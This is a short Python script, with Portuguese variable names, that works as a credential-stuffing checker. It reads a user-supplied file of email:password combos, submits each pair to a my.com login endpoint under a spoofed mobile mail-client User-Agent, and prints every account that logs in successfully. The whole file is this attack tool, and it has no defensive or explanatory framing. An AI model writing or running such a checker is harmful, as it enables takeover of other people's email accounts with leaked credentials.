import requests

db=open(input('Caminho da DB: '), 'r').read().splitlines()

def checker(email, senha):
    acesso=requests.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+email+'&Password='+senha, headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
    if ('Ok=1') in acesso:
        print('Email acessado: '+combo)
for combo in db:
    email=combo.split(':')[1]
    senha=combo.split(':')[2]
    checker(email, senha)
